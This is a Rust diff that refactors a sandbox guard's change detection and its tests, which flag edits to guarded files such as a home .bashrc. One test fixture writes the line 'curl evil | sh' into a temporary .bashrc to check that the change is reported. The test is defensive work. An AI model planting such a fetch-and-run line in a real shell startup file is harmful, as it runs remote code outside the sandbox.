@@ -206,11 +206,11 @@ fn take(cwd: &Path, roots: &[PathBuf], home: Option<&Path>) -> Snapshot {
 
 /// The line for the tool result when something guarded changed since `before` (None: nothing did).
 pub fn after(before: Snapshot, s: &SandboxSettings, cwd: &Path) -> Option<String> {
-    after_in(before, s, cwd, dirs::home_dir().as_deref())
+    after_in(before, &s.write_roots(cwd), cwd, dirs::home_dir().as_deref())
 }
 
-fn after_in(before: Snapshot, s: &SandboxSettings, cwd: &Path, home: Option<&Path>) -> Option<String> {
-    let now = take(cwd, &s.write_roots(cwd), home);
+fn after_in(before: Snapshot, roots: &[PathBuf], cwd: &Path, home: Option<&Path>) -> Option<String> {
+    let now = take(cwd, roots, home);
     let mut changed: Vec<&PathBuf> = Vec::new();
     for (p, sig) in &now.seen {
         if before.seen.get(p) != Some(sig) {
@@ -253,10 +253,6 @@ mod tests {
     use super::*;
     use std::fs;
 
-    fn ws() -> SandboxSettings {
-        SandboxSettings::new(SandboxMode::WorkspaceWrite, false, vec![])
-    }
-
     fn roots(d: &Path) -> Vec<PathBuf> {
         vec![d.canonicalize().unwrap()]
     }
@@ -264,7 +260,7 @@ mod tests {
     fn diff(d: &Path, act: impl FnOnce()) -> Option<String> {
         let b = take(d, &roots(d), None);
         act();
-        after_in(b, &ws(), d, None)
+        after_in(b, &roots(d), d, None)
     }
 
     #[test]
@@ -362,7 +358,7 @@ mod tests {
             let roots = vec![writable.canonicalize().unwrap()];
             let b = take(cwd, &roots, Some(&home));
             fs::write(home.join(".bashrc"), "curl evil | sh").unwrap();
-            let n = after_in(b, &ws(), cwd, Some(&home)).unwrap();
+            let n = after_in(b, &roots, cwd, Some(&home)).unwrap();
             assert!(n.contains(".bashrc") && n.ends_with("which runs outside the sandbox later]"), "{n}");
             fs::remove_file(home.join(".bashrc")).unwrap();
         }
@@ -378,7 +374,7 @@ mod tests {
         let roots = vec![proj.canonicalize().unwrap()];
         let b = take(&proj, &roots, Some(&home));
         fs::write(home.join(".bashrc"), "x").unwrap();
-        assert!(after_in(b, &ws(), &proj, Some(&home)).is_none());
+        assert!(after_in(b, &roots, &proj, Some(&home)).is_none());
     }
 
     /// A home folder with a project inside, and the roots that let a command write all of it.
@@ -393,7 +389,7 @@ mod tests {
     fn home_diff(home: &Path, proj: &Path, roots: &[PathBuf], act: impl FnOnce()) -> Option<String> {
         let b = take(proj, roots, Some(home));
         act();
-        after_in(b, &ws(), proj, Some(home))
+        after_in(b, roots, proj, Some(home))
     }
 
     #[cfg(unix)]
